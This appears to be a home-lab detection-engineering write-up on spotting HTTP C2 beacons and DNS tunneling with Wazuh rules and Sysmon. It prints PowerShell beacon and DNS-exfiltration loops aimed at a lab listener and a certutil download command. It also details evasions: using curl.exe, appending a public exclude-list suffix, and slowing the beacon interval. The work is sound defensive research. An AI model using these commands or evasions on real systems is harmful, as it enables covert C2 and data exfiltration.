# Lab 05 - Command and Control: Network Beacon and DNS Tunneling (T1071.001 / T1071.004)

## Objective
Detect an implant **calling home** - the phase after execution, where attacker code
must reach a server it controls to receive tasking and return data. Two transports
are covered because they fail differently: **HTTP/S beaconing** (Sysmon Event ID 3)
and **DNS tunneling** (Sysmon Event ID 22).

The lab exists to make one distinction concrete:

| Transport | Per-event signal? | Detection shape |
|---|---|---|
| HTTP/S beacon (T1071.001) | **No** | correlation - `frequency` + `same_field` over many events |
| DNS tunneling (T1071.004) | **Yes** | single event - abnormally long / high-entropy first label |

A single outbound HTTPS connection is indistinguishable from a browser tab. What
makes traffic a *beacon* is **regularity across many events** - same destination,
same interval, low variance. Wazuh's rule engine matches one event at a time and
offers a rate counter; it cannot compute an interval or its variance. Everything
this lab concludes about the beacon rule follows from that structural limit, and
the limit is stated up front rather than discovered in production.

DNS is the opposite case. Data-over-DNS forces attacker-chosen labels into the
query name, and a 45-character base32-looking label in the first position is
anomalous in a single event, with no correlation required.

## MITRE ATT&CK
| Field | Value |
|---|---|
| Tactic | Command and Control, Exfiltration |
| Technique | T1071.001 - Application Layer Protocol: Web Protocols |
| Technique | T1071.004 - Application Layer Protocol: DNS |
| Related | T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol |
| Related | T1105 - Ingress Tool Transfer (the blocked `certutil` variant) |
| Reference | https://attack.mitre.org/techniques/T1071/001/ |
| Reference | https://attack.mitre.org/techniques/T1071/004/ |

## Environment
| Component | Details |
|---|---|
| Endpoint | Windows 11 - agent ID 002 `windows`, host-only 192.168.56.103 |
| Manager | Ubuntu Server, Wazuh 4.14.6 all-in-one, 192.168.56.79 |
| Sensor | Sysmon v15.21, SwiftOnSecurity config - **unmodified for this lab** |
| New events | Sysmon **Event ID 3** (NetworkConnect), **Event ID 22** (DnsQuery) |
| Custom rules | **100503**, **100504**, **100505** in `local_rules.xml` |
| C2 listener | `python3 -m http.server 80` on 192.168.56.79 |

The listener and the SIEM manager are the same host. That is an artefact of a
two-VM lab, not part of the technique - the detections key on repetition and
source image and never reference a destination address. The Kali attacker VM was
unavailable (credentials unrecoverable over SSH) and contributes nothing to the
findings, all of which are endpoint-side.

## Prerequisite - none, for the first time in this module
Labs 02 and 04 both required amending the SwiftOnSecurity config before any
telemetry existed (`ProcessAccess` was an empty include; `ImageLoad` was fully
disabled). Lab 05 required **no config change at all**. The live config reports:

```
 - Network connection:            enabled
 - DNS lookup:                    enabled
```

and a forced probe raised one of each immediately.

**Idle baseline, 5 minutes on an otherwise quiet desktop:**

| Event ID | Count | Source |
|---|---|---|
| 10 (ProcessAccess) | 19 | Lab 02 amendment |
| 1 (ProcessCreate) | 10 | shipped |
| 7 (ImageLoad, unsigned only) | 6 | Lab 04 amendment |
| 3 (NetworkConnect) | 1 | shipped |
| 22 (DnsQuery) | **0** | shipped |

The pre-lab concern was that EID 22 uses **exclude**-list semantics - log
everything except a named allow-list - and would flood a 3 GB manager. It did
not. The exclusion list plus the Windows DNS client cache absorb effectively all
idle chatter on this host.

**That result must be read honestly.** A near-zero DNS baseline is a property of
an idle single-user VM behind an aggressive exclude-list. On a real endpoint EID
22 is among the highest-volume events Sysmon produces. The detection below looks
cleaner here than it would in production, and no false-positive rate is claimed
from it.

`logall_json` remained **off** throughout, consistent with Labs 03 and 04.

## What the sensor collects - and does not
Reading the live config rather than trusting the Lab 01 audit table (the lesson
from Lab 04) produced two findings before any packet was sent.

### Finding 1 - EID 3 is an include-list keyed on where the binary lives
`sysmonconfig.xml` lines 271-380. `NetworkConnect onmatch="include"` fires only
when the source image is:

- in a suspicious directory - `C:\Users`, `C:\ProgramData`, `C:\Windows\Temp`,
  `C:\perflogs`, `C:\intel`, `C:\Windows\fonts`, `C:\Windows\system32\config`,
  `C:\Recycle`, or a device path; **or**
- one of ~60 named binaries - `powershell.exe`, `cmd.exe`, `certutil.exe`,
  `regsvr32.exe`, `rundll32.exe`, `mshta.exe`, `nslookup.exe`, `notepad.exe`,
  `bitsadmin.exe`, `nc.exe`, `psexec.exe`, `tor.exe`, Office apps, ...; **or**
- connecting to a listed port - 22, 23, 25, 143, 3389, 4444, 5800, 5900, 1080,
  3128, 8080, 1723, 9001, 9030.

Read the negative. **Ports 80 and 443 are absent from that port list**, so a web
connection is logged only on an image match. An implant running inside a signed
binary under `C:\Program Files` produces **zero EID 3 events** - not a missed
alert, no telemetry at all.

That is precisely the endpoint state Lab 04 created: attacker code executing
inside a legitimately-installed signed process in a normal directory. **The DLL
side-load of Lab 04 defeats this lab's sensor as a side effect.** Coverage
depends on the implant's file path, which is the one thing an attacker chooses
freely. Proven empirically as Test 3 below.

### Finding 2 - EID 22 is an exclude-list, and the exclude-list is public
`sysmonconfig.xml` lines 924 onward. `DnsQuery onmatch="exclude"` logs everything
*except* a named list: `.microsoft.com`, `.msedge.net`, `.b-msedge.net`,
`.windows.net.nsatc.net`, `.opinsights.azure.com`, `.office.net`, `.bing.com`,
`.arpa`, and roughly forty more.

The SwiftOnSecurity config is a public GitHub file. **The exclusion list is
therefore a published evasion map**, and several entries are Microsoft-operated
CDN and telemetry namespaces of exactly the kind cloud-C2 and domain-fronting
abuse. Any query whose name ends in an excluded suffix is invisible at the
sensor, regardless of what the rest of the name contains. Proven as Test 4.

## What the shipped ruleset covers - and does not

### Finding 3 - DNS has zero shipped detections
`sysmon_event_22` appears exactly once across the entire shipped ruleset:

```xml
<rule id="61650" level="0">
  <if_sid>61600</if_sid>
  <field name="win.system.eventID">^22$</field>
  <description>Sysmon - Event 22: DNS Query event</description>
  <options>no_full_log</options>
  <group>sysmon_event_22,</group>
</rule>
```

That is a group tag, not a detection. Every DNS query on every Windows endpoint
decodes, tags, and dies silently at level 0. There is no `sysmon_id_22` rule file
- the directory holds dedicated files for events 1, 3, 7, 8, 10, 11, 13 and 20,
and nothing for 22.

This is the third consecutive lab in this module to find a **total** gap: no
`regsvr32` coverage (Lab 03), no signature-based EID 7 coverage (Lab 04), no DNS
coverage at all (Lab 05). At three it stops being coincidence.

### Finding 4 - EID 3 has ten rules, none of which look at egress
`0810-sysmon_id_3.xml` holds rules 92101-92110. The ports they key on:

| Rule | Level | Port / condition | Intent |
|---|---|---|---|
| 92101 | **0** | `powershell.exe` + tcp | base, silent |
| 92102 | 6 | 135 | DCOM/RPC |
| 92103 | 6 | 389 | LDAP |
| 92104 | 15 | U+202E in image name | masquerading |
| 92105 | 3 | 135, 445 | admin shares |
| 92106 | 3 | + image `System` | SMB |
| 92107 | 4 | `cscript`/`wscript` + tcp | script network use |
| 92108 | **0** | 3389 | RDP, silent |
| 92109 | 15 | 3389 to/from loopback | reverse tunnel |
| 92110 | 4 | 5985 | WinRM |

**135, 389, 445, 3389, 5985.** Every one is a lateral-movement port. Ports 80 and
443 appear nowhere in the file. A beacon to a web port - the overwhelmingly common
C2 shape - reaches rule 92101 (level 0) and stops.

The file is not badly written; it is written to a different threat model. Someone
modelled an attacker moving *sideways* and nobody modelled one calling *home*.
Note also that 92108 (RDP) is deliberately level 0: the shipped authors already
concluded that port-based rules alone are too noisy to alert on, which is an
argument *for* the correlation approach used below.

## Attack simulation
All commands run on the Windows endpoint. The listener log on 192.168.56.79
provides independent server-side confirmation for every test, which matters most
for the negative controls - "no alert fired" is weak, "the connections
demonstrably happened and the sensor recorded nothing" is not.

**Beacon (T1071.001)** - twelve requests, five seconds apart:

```powershell
1..12 | ForEach-Object {
  try { Invoke-WebRequest -Uri "http://192.168.56.79/" -UseBasicParsing -TimeoutSec 5 | Out-Null } catch {}
  Start-Sleep -Seconds 5
}
```

**DNS tunneling (T1071.004)** - ten lookups with 45-character random labels:

```powershell
1..10 | ForEach-Object {
  $label = -join (1..45 | ForEach-Object { [char](Get-Random -InputObject ((48..57)+(97..122))) })
  Resolve-DnsName -Name "$label.exfil.lab05.test" -ErrorAction SilentlyContinue | Out-Null
  Start-Sleep -Milliseconds 800
}
```

No DNS server is required anywhere. `.test` is a reserved TLD that will never
resolve, and every query returned `QueryStatus: 9003` (NXDOMAIN). **The detection
fired anyway, because the signal is the query, not the answer** - which is the
whole reason endpoint DNS-exfil detection works: the attacker's data has already
left the machine by the time resolution fails.

**A third variant was blocked before the SIEM saw it.** `certutil.exe` as an HTTP
downloader (T1105) failed to launch at all:

```
Program 'certutil.exe' failed to run: Access is denied
```

Microsoft Defender log 1116/1117:

```
Name: Trojan:Win32/Ceprolad.A
Path: CmdLine:_C:\Windows\System32\certutil.exe -urlcache -split -f http://192.168.56.79/ ...
Action: Remove
```

Note the `Path` field: the detection is on the **command-line pattern**, not on a
file. Defender ships a signature for certutil-as-downloader and blocks execution
outright. This is the third pre-SIEM prevention block in the module, after the two
in Lab 03 - a consistent pattern worth naming: on a default-configured Windows 11
endpoint, the loudest LOLBin techniques never reach the SIEM, so custom rules are
a backstop for the quieter forms rather than a frontline control.

## Detection rules (on the manager)
Added to `/var/ossec/etc/rules/local_rules.xml`:

```xml
<group name="sysmon,windows,local,lab05,">

  <!-- T1071.004: exfiltration / C2 over DNS -->
  <rule id="100503" level="12">
    <if_group>sysmon_event_22</if_group>
    <field name="win.eventdata.queryName" type="pcre2">^[A-Za-z0-9+/=_-]{32,63}\.</field>
    <description>Possible DNS tunneling: abnormally long subdomain label in $(win.eventdata.queryName) by $(win.eventdata.image)</description>
    <mitre>
      <id>T1071.004</id>
      <id>T1048.003</id>
    </mitre>
  </rule>

  <!-- T1071.001: outbound web-port connection. Deliberately quiet. -->
  <rule id="100504" level="3">
    <if_sid>61605, 92101</if_sid>
    <field name="win.eventdata.destinationPort" type="pcre2">^(80|443|8080|8443)$</field>
    <options>no_full_log</options>
    <description>Outbound web-port connection to $(win.eventdata.destinationIp):$(win.eventdata.destinationPort) by $(win.eventdata.image)</description>
    <mitre>
      <id>T1071.001</id>
    </mitre>
  </rule>

  <!-- T1071.001: repetition to one destination = candidate beacon -->
  <rule id="100505" level="12" frequency="8" timeframe="120">
    <if_matched_sid>100504</if_matched_sid>
    <same_field>win.eventdata.destinationIp</same_field>
    <same_field>win.eventdata.image</same_field>
    <description>Possible C2 beacon: repeated outbound web-port connections to $(win.eventdata.destinationIp) by $(win.eventdata.image)</description>
    <mitre>
      <id>T1071.001</id>
    </mitre>
  </rule>

</group>
```

Design, each choice mapped to an interviewer's probe:

- **100503 keys on label length, not on the domain.** A blocklist of known C2
  domains is obsolete the day it ships. Label length is a property of the
  *encoding* that data-over-DNS requires, so it survives domain rotation.
- **`{32,63}`** - 63 is the DNS protocol maximum for a single label, so the upper
  bound is free. 32 is the tunable, and Test 5 is its control.
- **100504 is level 3 on purpose.** It is correlation fuel, not an alert. The
  shipped ruleset reached the same conclusion for RDP (92108, level 0).
- **Two `same_field` tags - destination IP *and* image.** Without the image
  constraint, several processes touching one CDN would trip the rule. Without the
  IP constraint, ordinary cloud chatter would. Validated organically against live
  OneDrive traffic (below).
- **`frequency="8"` / `timeframe="120"`** - measured, not assumed: the composite
  fired on exactly the **8th** matching event, and the counter **resets after
  firing**, so a long beacon produces one alert per burst rather than an alert
  storm.

## The shadow that hid the beacon - shipped rule 92101
The first beacon run produced **twelve EID 3 events on the endpoint and zero
alerts on the manager.** The events were present and correctly timestamped; the
manager simply never alerted on any connection to the listener.

The cause is shipped rule 92101:

```xml
<rule id="92101" level="0">
  <if_group>sysmon_event3</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)\\powershell\.exe</field>
  <field name="win.eventdata.protocol">^tcp$</field>
  <description>Powershell process communicating over TCP</description>
</rule>
```

Rule 100504 was originally written as `<if_group>sysmon_event3</if_group>`, making
it a **sibling** of 92101. Wazuh is first-match-wins. For OneDrive traffic 92101
does not match and 100504 alerts normally - which is exactly what the logs showed,
every 100504 hit being OneDrive and never PowerShell. For PowerShell traffic 92101
matches first, **at level 0**, and the event is consumed without an alert.

> The shipped ruleset takes the single most common C2 host process, matches its
> network traffic with a rule that deliberately produces no alert, and in doing so
> silently disables any custom detection written the natural way.

Same class of defect as the Lab 01 finding (92007 shadowed by 92027) - except here
it eats a *custom* rule, which is the more useful version of the story: a detection
engineer can add a rule, see it validate cleanly, and never learn it does nothing.

**The fix** re-parents 100504 to the leaf that wins the race as well as the generic
base:

```xml
<if_sid>61605, 92101</if_sid>
```

The precedent is in Wazuh's own file: rule **92110** (WinRM) uses
`<if_sid>92101, 61605</if_sid>` for exactly this reason. Their authors hit the
same shadow and worked around it locally rather than fixing 92101 - so the defect
is known to the people who shipped it and left in place.

**Proof:** the identical beacon, unchanged in every respect, re-run after the
one-line edit:

```
19:03:39.988  100504  L3   <- 1
19:03:39.991  100504  L3   <- 2
19:03:41.207  100504  L3   <- 3
19:03:46.604  100504  L3   <- 4
19:03:51.478  100504  L3   <- 5
19:03:56.628  100504  L3   <- 6
19:04:01.479  100504  L3   <- 7
19:04:06.620  100505  L12  <- 8  BEACON
```

## Detection results - full test matrix
Every row is corroborated by the listener's own access log on 192.168.56.79, so
negative results distinguish "no connection" from "connection, no telemetry".

| # | Test | Server saw it? | Sensor logged? | Rule | Level | Verdict |
|---|---|---|---|---|---|---|
| 1 | PowerShell beacon, 12 x 5s (pre-fix) | yes, 17:42:51-17:43:46 | yes, 12 x EID 3 | **none** | - | **false negative - 92101 shadow** |
| 2 | PowerShell beacon, 12 x 5s (post-fix) | yes, 19:03:28-19:04:25 | yes, 12 x EID 3 | 100504 x11, **100505** | 3 / **12** | true positive |
| 3 | DNS, 10 x 45-char labels | n/a (NXDOMAIN) | yes, 10 x EID 22 | **100503** x10 | **12** | true positive |
| 4 | Same beacon from `curl.exe`, 10 x 3s | yes, 19:14:26-19:14:54 | **no - 0 EID 3** | - | - | **sensor blind spot - by design** |
| 5 | 45-char label under `.msedge.net` | n/a | **no - 0 EID 22** | - | - | **exclude-list evasion** |
| 6 | Five ordinary domains | n/a | yes | - | - | silent - correct |
| 7 | Slow beacon, 4 x 40s | yes, 19:23:35-19:25:36 | yes, 4 x EID 3 | 100504 x4 | 3 | **no beacon alert - periodicity limit** |
| 8 | `certutil.exe` download x10 | **no** | n/a | - | - | blocked by Defender pre-execution |
| 9 | Idle (5 min) | - | 1 x EID 3, 0 x EID 22 | - | - | silent - correct |

**Row 4 is the strongest result in the lab.** Ten completed TCP connections from
`C:\Windows\System32\curl.exe` - a signed Microsoft binary shipped on every
Windows 10/11 machine - to the same address and port that produced a level-12
alert from PowerShell minutes earlier. The newest EID 3 event at that moment was
ten minutes old. The detection worked because the attacker used PowerShell.

**Row 5** is the same payload that fired ten level-12 alerts, rendered invisible
by appending a suffix taken from a public GitHub file.

**Row 7** is the honest ceiling: identical process, destination, port and intent,
defeated by a sleep timer.

## The false positive that tuned itself
Rule 100504 fired thirteen times on OneDrive - `OneDrive.exe`,
`OneDrive.Sync.Service.exe`, `OneDriveStandaloneUpdater.exe`, all to port 443.
OneDrive is genuinely beacon-shaped: it checks in on a regular cadence, which is
the exact behaviour 100505 hunts.

**100505 never fired on it.** OneDrive rotates destinations - `150.171.109.77`,
`23.218.107.172`, `4.150.223.107`, `52.123.129.14`, `20.184.175.0` - a different
Microsoft front-end per check-in. The `same_field` on `destinationIp`
discriminated real cloud-service chatter from a beacon with no tuning at all.

At 19:21:09 two *different* OneDrive images hit the *same* IP within
milliseconds; the `same_field` on `image` kept them separate and 100505 still did
not fire.

This is a false positive that never needed fixing, found on live traffic rather
than constructed - a stronger argument for the design than any synthetic control.
It also names the evasion precisely: **a C2 that rotates its infrastructure per
check-in defeats this rule the same way OneDrive does.**

## Investigation steps
1. Alert 100505 fires. Take `destinationIp` and `image` from the description.
2. Pull every 100504 for that pair and read the **intervals**. Tight variance
   (5.0s, 5.1s, 4.9s) is a beacon; ragged intervals are an application.
3. Check whether the destination is reached by any *other* process. A single
   process talking to an address nothing else touches is far more suspicious than
   a shared CDN endpoint.
4. Pivot to Sysmon EID 1 for that `processGuid` - what launched it, with what
   command line, from what parent.
5. Pivot to EID 22 for the same process. A beacon that resolves its C2 by name
   leaves a DNS query; correlate the `queryName` against threat intel.
6. For 100503, decode the label. Base32/base64 that decodes to structured data
   confirms tunneling; a hash-like CDN label does not.
7. Check Defender's Operational log for the same time window. As Row 8 shows,
   prevention may have already acted on a related stage.

**Clock caveat, and it matters more here than in any previous lab.** Sysmon's own
`UtcTime` field ran a consistent **14 h 26 m** behind the EventChannel's
`systemTime` on this host, inside the same event record. NTP is inactive and the
manager writes UTC while the agent reports local time. A *constant* offset
preserves the deltas between events, so interval analysis still works - but every
absolute timestamp is wrong, so correlating against firewall or proxy logs would
silently line up the wrong minutes. Use `systemTime` for anything cross-source.

Related and practical: the XPath idiom
`TimeCreated[timediff(@SystemTime) <= 180000]` returned **zero** for events that
demonstrably existed and were correctly timestamped. That one-liner is widely
pasted in DFIR work. On a host with an untrustworthy clock, **read events, do not
count them.**

## Notes and limitations
1. **Rate is not periodicity.** `frequency`/`timeframe` counts events in a window.
   A beacon is defined by the *regularity* of its interval and the low variance of
   its jitter, which a single-event rule engine cannot compute. Row 7 proves the
   consequence: a 40-second sleep already evades a 120-second window, and an
   hourly beacon is invisible. Tools built for this problem (RITA, Zeek-based
   analysis) do the variance maths that a rule engine structurally cannot.
2. **One long-lived connection produces one event.** EID 3 fires per TCP
   connection, not per request. A C2 using HTTP keep-alive or a WebSocket
   generates a single EID 3 and evades any frequency rule. This lab's twelve
   events exist only because `python3 -m http.server` speaks HTTP/1.0 and closes
   after each response.
3. **Infrastructure rotation defeats `same_field`** - demonstrated accidentally
   and convincingly by OneDrive.
4. **Sensor coverage depends on the implant's file path and name**, not its
   behaviour (Rows 4 and Finding 1). Closing this properly means widening the
   `NetworkConnect` include-list, which trades directly against event volume - the
   community config's authors made that trade deliberately.
5. **The exclude-list is public** (Finding 2, Row 5). Any defence whose evasion
   conditions are published needs a second control that is not.
6. **The DNS baseline here is unrealistically quiet.** No false-positive rate is
   claimed for 100503. Test 6 (five hand-picked domains) is a weak control; a real
   one needs days of production DNS.
7. **The `{32,63}` threshold is untuned against real data.** Legitimate long
   labels exist - some CDN and telemetry endpoints use long hashes. 32 is a
   defensible starting point, not a validated one.
8. **DNS over HTTPS bypasses EID 22 entirely.** A resolver-independent implant
   using DoH produces no Sysmon DNS event at all, only an EID 3 to the DoH
   provider - which lands back in the weaker of the two detections.

## Lessons learned
- **A level-0 shipped rule can silently disable a custom detection.** This is the
  single most transferable finding in the module. Before trusting a new Wazuh
  rule, verify that no shipped sibling matches the same event first - and prefer
  `if_sid <leaf>` over `if_group` when a specific shipped rule is known to claim
  the event. Wazuh's own rule 92110 does exactly this.
- **A rule that validates cleanly and restarts cleanly can still do nothing.**
  `wazuh-analysisd -t` checks syntax, not reachability. The only proof is an
  event that fires it.
- **Negative controls carry the writeup.** Rows 4, 5 and 7 say more about the
  detection's real value than Rows 2 and 3 do. Anyone can write a rule that
  fires.
- **Read the sensor config as a threat model, not a feature list.** The ports the
  authors chose reveal the attacker they imagined. Both the SwiftOnSecurity config
  and Wazuh's EID 3 rules independently modelled lateral movement and independently
  ignored egress.
- **Server-side corroboration turns a weak negative into a strong one.** "No alert
  fired" invites the objection that nothing happened. The listener log removes it.
- **Prevention and detection see different attacks.** The loudest variant
  (`certutil`) never reached the SIEM at all; the quietest (`curl`) never reached
  the sensor. The SIEM's real contribution sits between those two.

## MITRE ATT&CK mapping
| Rule | Level | Technique | Tactic | Coverage |
|---|---|---|---|---|
| 100503 | 12 | T1071.004, T1048.003 | Command and Control, Exfiltration | Long/high-entropy DNS label - closes a total gap in the shipped ruleset |
| 100504 | 3 | T1071.001 | Command and Control | Outbound web-port connection - telemetry, not an alert |
| 100505 | 12 | T1071.001 | Command and Control | Repeated same-destination, same-image connections - rate proxy for beaconing |

Shipped coverage displaced or corrected: **61650** (DNS, level 0, no detection),
**92101** (PowerShell TCP, level 0, shadows custom rules).

## Status
**Complete.** Three custom rules deployed and confirmed firing on the live
endpoint, with a nine-row test matrix including five negative controls, every row
corroborated server-side. No Sysmon config amendment was required. `logall_json`
remained disabled.

Headline: **Wazuh's shipped ruleset has no DNS detection whatsoever, no egress
coverage in its ten Event ID 3 rules, and a level-0 PowerShell rule (92101) that
silently swallows custom network detections for the most common C2 host process
on Windows.** Rules 100503-100505 close the first two; the third is fixed by
re-parenting to `if_sid 61605, 92101`, the same workaround Wazuh's own rule 92110
uses. The lab also demonstrates the limits of the fix: a built-in `curl.exe`
defeats the sensor, a public exclude-list suffix defeats the DNS rule, and a
40-second sleep defeats the beacon rule.
